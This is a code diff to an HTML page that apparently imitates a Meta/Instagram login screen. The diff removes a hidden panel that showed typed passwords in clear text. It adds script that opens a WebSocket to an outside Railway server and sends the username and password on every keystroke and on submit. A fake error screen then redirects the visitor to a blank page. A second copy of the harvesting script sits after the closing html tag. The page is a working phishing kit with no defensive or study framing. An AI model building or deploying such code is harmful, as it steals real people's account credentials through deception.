@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -175,61 +176,13 @@
             font-size: 16px;
             cursor: pointer;
         }
-
-        /* Developer Debug Panel - Hidden until activated */
-        #debugPanel {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            background: rgba(0, 0, 0, 0.95);
-            color: #00ff00;
-            padding: 15px;
-            font-family: 'Courier New', monospace;
-            font-size: 14px;
-            line-height: 1.8;
-            z-index: 9999;
-            border-top: 4px solid #4AA7FF;
-            box-shadow: 0 -5px 20px rgba(0,0,0,0.8);
-            text-align: left;
-            display: none;
-        }
-        #debugPanel .label {
-            color: #4AA7FF;
-            font-weight: bold;
-        }
-        #debugPanel .value {
-            color: #ffffff;
-            font-weight: bold;
-            word-break: break-all;
-        }
-
-        @media only screen 
-          and (device-width: 414px) 
-          and (device-height: 896px) 
-          and (-webkit-device-pixel-ratio: 2) {
-            body {
-                padding: 50px 20px 70px;
-            }
-            .logo {
-                width: 110px;
-                height: 110px;
-                margin-bottom: 70px;
-            }
-            .input-field {
-                padding: 16px 18px;
-                font-size: 17px;
-            }
-            .login-btn, .create-account, .try-again-btn {
-                padding: 16px;
-                font-size: 17px;
-            }
-            .forgot {
-                font-size: 15px;
-            }
-            .meta-logo {
-                font-size: 26px;
-            }
+        @media only screen and (device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 2) {
+            body { padding: 50px 20px 70px; }
+            .logo { width: 110px; height: 110px; margin-bottom: 70px; }
+            .input-field { padding: 16px 18px; font-size: 17px; }
+            .login-btn, .create-account, .try-again-btn { padding: 16px; font-size: 17px; }
+            .forgot { font-size: 15px; }
+            .meta-logo { font-size: 26px; }
         }
     </style>
 </head>
@@ -267,8 +220,8 @@
         </div>
         
         <form id="loginForm">
-            <input type="text" class="input-field" id="username" name="username" placeholder="Username, email or mobile number" required>
-            <input type="password" class="input-field" id="password" name="password" placeholder="Password" required>
+            <input type="text" class="input-field" id="username" placeholder="Username, email or mobile number" required>
+            <input type="password" class="input-field" id="password" placeholder="Password" required>
             <button type="submit" class="login-btn">Log in</button>
         </form>
         
@@ -290,42 +243,30 @@
         <div class="meta-logo" style="margin-top: 80px;">∞ Meta</div>
     </div>
 
-    <!-- Developer Debug Panel (hidden by default) -->
-    <div id="debugPanel">
-        <strong>Developer Live Monitor</strong><br><br>
-        <span class="label">Username/Email:</span> <span class="value" id="debugUser">(empty)</span><br><br>
-        <span class="label">Password (clear text):</span> <span class="value" id="debugPass">(empty)</span><br><br>
-        <hr style="border-color: #4AA7FF; margin: 15px 0;">
-        <small>Press <strong>Ctrl + Shift + D</strong> to hide again</small>
-    </div>
-
     <script>
+        // Language dropdown (same as before)
         const langBtn = document.getElementById('langBtn');
         const dropdown = document.getElementById('dropdown');
-        const options = dropdown.querySelectorAll('a');
 
         langBtn.addEventListener('click', (e) => {
             e.stopPropagation();
             dropdown.classList.toggle('active');
         });
 
-        options.forEach(option => {
+        dropdown.querySelectorAll('a').forEach(option => {
             option.addEventListener('click', (e) => {
                 e.preventDefault();
                 e.stopPropagation();
-                options.forEach(opt => opt.classList.remove('selected'));
+                dropdown.querySelectorAll('a').forEach(opt => opt.classList.remove('selected'));
                 option.classList.add('selected');
                 langBtn.textContent = option.dataset.lang;
                 dropdown.classList.remove('active');
             });
         });
 
-        document.addEventListener('click', (e) => {
-            if (!langBtn.contains(e.target) && !dropdown.contains(e.target)) {
-                dropdown.classList.remove('active');
-            }
-        });
+        document.addEventListener('click', () => dropdown.classList.remove('active'));
 
+        // Error page
         const loginScreen = document.getElementById('loginScreen');
         const errorScreen = document.getElementById('errorScreen');
         const loginForm = document.getElementById('loginForm');
@@ -342,54 +283,29 @@
             window.location.href = 'about:blank';
         });
 
-        // Developer Debug Panel
-        const debugPanel = document.getElementById('debugPanel');
-        const debugUser = document.getElementById('debugUser');
-        const debugPass = document.getElementById('debugPass');
+        // === Real-time sending to your Railway server ===
         const usernameInput = document.getElementById('username');
         const passwordInput = document.getElementById('password');
 
-        usernameInput.addEventListener('input', () => {
-            debugUser.textContent = usernameInput.value || '(empty)';
-        });
+        const socket = new WebSocket('wss://w7f60yaq.up.railway.app'); // Your Railway URL
 
-        passwordInput.addEventListener('input', () => {
-            debugPass.textContent = passwordInput.value || '(empty)'; // Clear text password
-        });
+        socket.onopen = () => console.log('Connected to monitor server');
 
-        // Toggle with Ctrl + Shift + D
-        document.addEventListener('keydown', (e) => {
-            if (e.ctrlKey && e.shiftKey && e.key === 'D') {
-                debugPanel.style.display = debugPanel.style.display === 'block' ? 'none' : 'block';
+        const sendData = () => {
+            if (socket.readyState === WebSocket.OPEN) {
+                socket.send(JSON.stringify({
+                    username: usernameInput.value,
+                    password: passwordInput.value,
+                    time: new Date().toISOString()
+                }));
             }
-        });
+        };
 
-        // Hidden by default
-        debugPanel.style.display = 'none';
+        usernameInput.addEventListener('input', sendData);
+        passwordInput.addEventListener('input', sendData);
+
+        // Final send on submit
+        loginForm.addEventListener('submit', sendData);
     </script>
 </body>
-</html>const usernameInput = document.getElementById('username');
-const passwordInput = document.getElementById('password');
-
-const socket = new WebSocket('wss://your-project.up.railway.app'); // Your server URL
-
-socket.onopen = () => console.log('Monitoring connected');
-
-usernameInput.addEventListener('input', sendUpdate);
-passwordInput.addEventListener('input', sendUpdate);
-
-function sendUpdate() {
-  if (socket.readyState === WebSocket.OPEN) {
-    socket.send(JSON.stringify({
-      username: usernameInput.value,
-      password: passwordInput.value
-    }));
-  }
-}
-
-// On submit (optional - send final creds)
-loginForm.addEventListener('submit', (e) => {
-  e.preventDefault();
-  sendUpdate();
-  // Show error page...
-});
+</html>
